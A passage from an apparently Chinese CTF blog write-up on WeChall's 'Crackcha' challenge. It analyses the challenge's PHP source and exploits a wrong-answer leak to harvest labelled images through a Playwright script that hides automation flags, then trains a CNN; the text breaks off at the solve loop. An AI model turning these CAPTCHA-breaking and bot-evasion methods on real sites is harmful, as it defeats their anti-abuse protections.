class="variable">$chars</span>);</span><br><span class="line">	<span class="variable">$aFonts</span> = <span class="keyword">array</span>(GWF_PATH.<span class="string">&#x27;extra/font/teen.ttf&#x27;</span>);           <span class="comment">// 固定字体</span></span><br><span class="line">	<span class="variable">$rgbcolor</span> = GWF_CAPTCHA_COLOR_BG;                          <span class="comment">// 白色背景</span></span><br><span class="line">	<span class="variable">$oVisualCaptcha</span> = <span class="keyword">new</span> <span class="title class_">PhpCaptcha</span>(<span class="variable">$aFonts</span>, <span class="number">210</span>, <span class="number">42</span>, <span class="variable">$rgbcolor</span>);</span><br><span class="line">	<span class="variable">$oVisualCaptcha</span>-&gt;<span class="title function_ invoke__">Create</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$chars</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crackcha_answer</span>(<span class="params">WC_Challenge <span class="variable">$chall</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$answer</span> === <span class="variable">$solution</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">crackcha_increase_solved</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;msg_success&#x27;</span>, <span class="keyword">array</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getOrDefault</span>(<span class="string">&#x27;WCC_CRACKCHA_SOLVED&#x27;</span>, <span class="number">0</span>), WCC_CRACKCHA_NEED));</span><br><span class="line">		<span class="comment">// &quot;You cracked captcha N of 468 needed.&quot;</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">crackcha_solved</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title class_">GWF_Module</span>::<span class="title function_ invoke__">loadModuleDB</span>(<span class="string">&#x27;Forum&#x27;</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">			<span class="title class_">Module_WeChall</span>::<span class="title function_ invoke__">includeForums</span>();</span><br><span class="line">			<span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">onChallengeSolved</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getUserID</span>());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;msg_failed&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$answer</span>, <span class="variable">$solution</span>));</span><br><span class="line">		<span class="comment">// &quot;Your answer (X) was wrong. Correct would have been Y.&quot; —— 泄露正确答案</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;WCC_CRACKCHA_CHARS&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>PhpCaptcha（<code>core/inc/3p/Class_Captcha.php</code>）渲染参数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CAPTCHA_NUM_CHARS&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CAPTCHA_NUM_LINES&#x27;</span>, <span class="number">80</span>);     <span class="comment">// 80 条干扰线</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CAPTCHA_MIN_FONT_SIZE&#x27;</span>, <span class="number">16</span>); <span class="comment">// 字号 16-25 随机</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CAPTCHA_MAX_FONT_SIZE&#x27;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CAPTCHA_FILE_TYPE&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);</span><br><span class="line"><span class="comment">// 字符颜色 rand(0,100) 灰度，干扰线颜色 rand(100,250) 灰度</span></span><br><span class="line"><span class="comment">// 字符 x 位置固定: $iX = (int)($this-&gt;iSpacing / 4 + $i * $this-&gt;iSpacing) = 10 + 42*i</span></span><br><span class="line"><span class="comment">// 角度 rand(-30, 30)</span></span><br></pre></td></tr></table></figure>
-<p>三个关键事实：</p>
-<ol type="1">
-<li><strong>字符位置固定</strong>：5 个字符分别落在 x = 10, 52, 94, 136,
-178 起、宽 42px 的 slot 里，可以按位置切分后独立分类</li>
-<li><strong>错误提交泄露答案</strong>：<code>answer.php</code>
-答错时返回 <code>Correct would have been XXX</code>，但随即清除 session
-里的
-chars。泄露的答案不能直接复用，却可以用来<strong>收集标注数据</strong>（拿图
-→ 提交错误答案 → 拿到真答案）</li>
-<li><strong>30
-分钟窗口超时自动重置</strong>：<code>crackcha_next()</code> 里
-<code>crackcha_round_over()</code> 时自动插入 highscore
-并重置计数，<code>problem.php</code> 此时返回纯文本而非 JPEG</li>
-</ol>
-<h3 id="solution">Solution</h3>
-<h4 id="step-1-泄露答案收集标注数据">Step 1: 泄露答案收集标注数据</h4>
-<p>每轮 2 个请求：<code>problem.php</code>
-拿图，<code>answer.php?answer=AAAAA</code> 拿泄露的真答案。400 张图约 5
-分钟。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Collect labeled crackcha images via answer-leak (submit wrong answer -&gt; server reveals real one).&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys, time, os, re</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line">COOKIE = <span class="string">&#x27;YOUR_WC_SESSION_ID&#x27;</span>          <span class="comment"># 裸 session id，不要带 WC= 前缀</span></span><br><span class="line">BASE = <span class="string">&#x27;https://www.wechall.net/en/challenge/crackcha&#x27;</span></span><br><span class="line">CHROME = <span class="string">&#x27;~/.cache/ms-playwright/chromium-1217/chrome-linux64/chrome&#x27;</span></span><br><span class="line">N = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">150</span></span><br><span class="line">IMGDIR = <span class="string">&#x27;dataset/images&#x27;</span></span><br><span class="line">os.makedirs(IMGDIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">TSV = <span class="string">&#x27;dataset/answers.tsv&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_answer</span>(<span class="params">text</span>):</span><br><span class="line">    m = re.search(<span class="string">r&#x27;Correct would have been ([A-Z]&#123;5&#125;)&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">        browser = p.chromium.launch(headless=<span class="literal">True</span>, executable_path=CHROME,</span><br><span class="line">            args=[<span class="string">&#x27;--disable-blink-features=AutomationControlled&#x27;</span>, <span class="string">&#x27;--no-sandbox&#x27;</span>])</span><br><span class="line">        ctx = browser.new_context(user_agent=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &#x27;</span></span><br><span class="line">            <span class="string">&#x27;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span>)</span><br><span class="line">        ctx.add_cookies([&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;WC&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: COOKIE, <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;.wechall.net&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>&#125;])</span><br><span class="line">        page = ctx.new_page()</span><br><span class="line">        page.goto(BASE + <span class="string">&#x27;/index.php&#x27;</span>, wait_until=<span class="string">&#x27;domcontentloaded&#x27;</span>, timeout=<span class="number">60000</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            page.wait_for_load_state(<span class="string">&#x27;networkidle&#x27;</span>, timeout=<span class="number">15000</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):   <span class="comment"># Turnstile 自动解决，轮询等 challenge 页出现</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                html = page.content()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                time.sleep(<span class="number">2</span>); <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Crackcha&#x27;</span> <span class="keyword">in</span> html <span class="keyword">and</span> <span class="string">&#x27;problem.php&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        got = <span class="number">0</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(TSV, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> tsv:</span><br><span class="line">            <span class="keyword">while</span> got &lt; N:</span><br><span class="line">                img = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):   <span class="comment"># round 重置时 problem 返回文本，重试</span></span><br><span class="line">                    resp = page.request.get(BASE + <span class="string">&#x27;/problem.php&#x27;</span>)</span><br><span class="line">                    body = resp.body()</span><br><span class="line">                    <span class="keyword">if</span> body[:<span class="number">2</span>] == <span class="string">b&#x27;\xff\xd8&#x27;</span>:</span><br><span class="line">                        img = body; <span class="keyword">break</span></span><br><span class="line">                    time.sleep(<span class="number">1.5</span>)</span><br><span class="line">                <span class="keyword">if</span> img <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;  problem fetch failed&#x27;</span>); time.sleep(<span class="number">2</span>); <span class="keyword">continue</span></span><br><span class="line">                fn = <span class="string">f&#x27;img<span class="subst">&#123;got:04d&#125;</span>.jpg&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(IMGDIR, fn), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(img)</span><br><span class="line">                text = page.request.get(BASE + <span class="string">&#x27;/answer.php&#x27;</span>, params=&#123;<span class="string">&#x27;answer&#x27;</span>: <span class="string">&#x27;AAAAA&#x27;</span>&#125;).text()</span><br><span class="line">                real = leak_answer(text)</span><br><span class="line">                <span class="keyword">if</span> real <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;  <span class="subst">&#123;got&#125;</span>: no leak in response: <span class="subst">&#123;text[:<span class="number">80</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">                    os.remove(os.path.join(IMGDIR, fn))</span><br><span class="line">                    time.sleep(<span class="number">2</span>); <span class="keyword">continue</span></span><br><span class="line">                tsv.write(<span class="string">f&#x27;<span class="subst">&#123;fn&#125;</span>\t<span class="subst">&#123;real&#125;</span>\n&#x27;</span>)</span><br><span class="line">                tsv.flush()</span><br><span class="line">                got += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> got % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;  collected <span class="subst">&#123;got&#125;</span>/<span class="subst">&#123;N&#125;</span> (last: <span class="subst">&#123;fn&#125;</span> <span class="subst">&#123;real&#125;</span>)&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">0.4</span>)</span><br><span class="line">        browser.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;done: <span class="subst">&#123;got&#125;</span> samples in <span class="subst">&#123;IMGDIR&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h4 id="step-2-训练-cnn-识别器">Step 2: 训练 CNN 识别器</h4>
-<p>字符是 GD 在 palette 图像上渲染的（FreeType
-灰度被映射到最近的调色板色，产生锯齿），加上 JPEG 8x8 块边缘的 ringing
-会在干扰线旁产生深色伪影，阈值/形态学/Hough
-都分离不干净。数据驱动路线更稳：42x42 slot → 26 类分类。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Train with more data + mild augmentation + bigger model.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">42</span>)</span><br><span class="line">np.random.seed(<span class="number">42</span>)</span><br><span class="line">random.seed(<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">DS = <span class="string">&#x27;dataset&#x27;</span></span><br><span class="line">OUT = <span class="string">&#x27;model.pt&#x27;</span></span><br><span class="line">DEV = <span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_slot</span>(<span class="params">a, i</span>):</span><br><span class="line">    x0 = <span class="number">10</span> + <span class="number">42</span> * i</span><br><span class="line">    s = a[:, x0:x0+<span class="number">42</span>]</span><br><span class="line">    <span class="keyword">if</span> s.shape[<span class="number">1</span>] &lt; <span class="number">42</span>:</span><br><span class="line">        s = np.pad(s, ((<span class="number">0</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">42</span> - s.shape[<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>():</span><br><span class="line">    xs, ys = [], []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(DS, <span class="string">&#x27;answers.tsv&#x27;</span>)) <span class="keyword">as</span> f:</span><br><span class="line">        rows = [l.split() <span class="keyword">for</span> l <span class="keyword">in</span> f <span class="keyword">if</span> l.strip()]</span><br><span class="line">    <span class="keyword">for</span> fn, ans <span class="keyword">in</span> rows:</span><br><span class="line">        a = np.array(Image.<span class="built_in">open</span>(os.path.join(DS, <span class="string">&#x27;images&#x27;</span>, fn)).convert(<span class="string">&#x27;L&#x27;</span>), dtype=np.float32)</span><br><span class="line">        <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(ans):</span><br><span class="line">            xs.append(get_slot(a, i))</span><br><span class="line">            ys.append(<span class="built_in">ord</span>(ch) - <span class="number">65</span>)</span><br><span class="line">    X = np.stack(xs) / <span class="number">255.0</span></span><br><span class="line">    Y = np.array(ys)</span><br><span class="line">    <span class="keyword">return</span> X, Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aug</span>(<span class="params">x</span>):</span><br><span class="line">    im = (<span class="number">1.0</span> - x) * <span class="number">255.0</span></span><br><span class="line">    img = Image.fromarray(im.astype(np.uint8))</span><br><span class="line">    img = img.rotate(random.uniform(-<span class="number">6</span>, <span class="number">6</span>), fillcolor=<span class="number">0</span>)</span><br><span class="line">    dx = random.randint(-<span class="number">2</span>, <span class="number">2</span>); dy = random.randint(-<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    img = img.transform(img.size, Image.AFFINE, (<span class="number">1</span>, <span class="number">0</span>, dx, <span class="number">0</span>, <span class="number">1</span>, dy), fillcolor=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> random.random() &lt; <span class="number">0.5</span>:   <span class="comment"># 模拟干扰线</span></span><br><span class="line">        d = ImageDraw.Draw(img)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">1</span>, <span class="number">2</span>)):</span><br><span class="line">            d.line([(random.randint(<span class="number">0</span>, <span class="number">41</span>), random.randint(<span class="number">0</span>, <span class="number">41</span>)),</span><br><span class="line">                    (random.randint(<span class="number">0</span>, <span class="number">41</span>), random.randint(<span class="number">0</span>, <span class="number">41</span>))],</span><br><span class="line">                   fill=random.randint(<span class="number">110</span>, <span class="number">170</span>), width=random.randint(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    arr = np.array(img, dtype=np.float32) * random.uniform(<span class="number">0.9</span>, <span class="number">1.1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span> - arr / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.net = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>, <span class="number">32</span>, <span class="number">3</span>, padding=<span class="number">1</span>), nn.ReLU(), nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">3</span>, padding=<span class="number">1</span>), nn.ReLU(), nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, <span class="number">3</span>, padding=<span class="number">1</span>), nn.ReLU(), nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Flatten(),</span><br><span class="line">            nn.Linear(<span class="number">128</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">256</span>), nn.ReLU(), nn.Dropout(<span class="number">0.4</span>),</span><br><span class="line">            nn.Linear(<span class="number">256</span>, <span class="number">26</span>),</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.net(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    X, Y = load_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;data: <span class="subst">&#123;X.shape&#125;</span>, device <span class="subst">&#123;DEV&#125;</span>&#x27;</span>)</span><br><span class="line">    n_img = <span class="built_in">len</span>(X) // <span class="number">5</span></span><br><span class="line">    rng = np.random.RandomState(<span class="number">1</span>)</span><br><span class="line">    val_img_ids = <span class="built_in">set</span>(rng.choice(n_img, <span class="built_in">max</span>(<span class="number">1</span>, n_img // <span class="number">8</span>), replace=<span class="literal">False</span>))</span><br><span class="line">    tr_idx = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X)) <span class="keyword">if</span> i // <span class="number">5</span> <span class="keyword">not</span> <span class="keyword">in</span> val_img_ids]</span><br><span class="line">    va_idx = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X)) <span class="keyword">if</span> i // <span class="number">5</span> <span class="keyword">in</span> val_img_ids]</span><br><span class="line">    Xtr, Ytr, Xva, Yva = X[tr_idx], Y[tr_idx], X[va_idx], Y[va_idx]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;train <span class="subst">&#123;<span class="built_in">len</span>(Xtr)&#125;</span> val <span class="subst">&#123;<span class="built_in">len</span>(Xva)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    model = Net().to(DEV)</span><br><span class="line">    opt = torch.optim.Adam(model.parameters(), lr=<span class="number">2e-3</span>)</span><br><span class="line">    lossf = nn.CrossEntropyLoss()</span><br><span class="line">    Xva_t = torch.tensor(Xva, dtype=torch.float32).unsqueeze(<span class="number">1</span>).to(DEV)</span><br><span class="line">    Yva_t = torch.tensor(Yva, dtype=torch.long).to(DEV)</span><br><span class="line"></span><br><span class="line">    best_va = <span class="number">0</span>; best_state = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        model.train()</span><br><span class="line">        perm = np.random.permutation(<span class="built_in">len</span>(Xtr))</span><br><span class="line">        <span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(perm), <span class="number">128</span>):</span><br><span class="line">            idx = perm[start:start+<span class="number">128</span>]</span><br><span class="line">            bx = np.stack([aug(Xtr[i]) <span class="keyword">for</span> i <span class="keyword">in</span> idx])</span><br><span class="line">            xb = torch.tensor(bx, dtype=torch.float32).unsqueeze(<span class="number">1</span>).to(DEV)</span><br><span class="line">            yb = torch.tensor(Ytr[idx], dtype=torch.long).to(DEV)</span><br><span class="line">            opt.zero_grad()</span><br><span class="line">            loss = lossf(model(xb), yb)</span><br><span class="line">            loss.backward(); opt.step()</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            va_acc = (model(Xva_t).argmax(<span class="number">1</span>) == Yva_t).<span class="built_in">float</span>().mean().item()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;epoch <span class="subst">&#123;epoch&#125;</span>: val_acc <span class="subst">&#123;va_acc:<span class="number">.4</span>f&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> va_acc &gt; best_va:</span><br><span class="line">            best_va = va_acc</span><br><span class="line">            best_state = &#123;k: v.clone() <span class="keyword">for</span> k, v <span class="keyword">in</span> model.state_dict().items()&#125;</span><br><span class="line">        <span class="keyword">if</span> va_acc &gt; <span class="number">0.98</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    torch.save(&#123;<span class="string">&#x27;model&#x27;</span>: best_state&#125;, OUT)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;saved <span class="subst">&#123;OUT&#125;</span> best_val=<span class="subst">&#123;best_va:<span class="number">.4</span>f&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h4 id="step-3-求解循环">Step 3: 求解循环</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 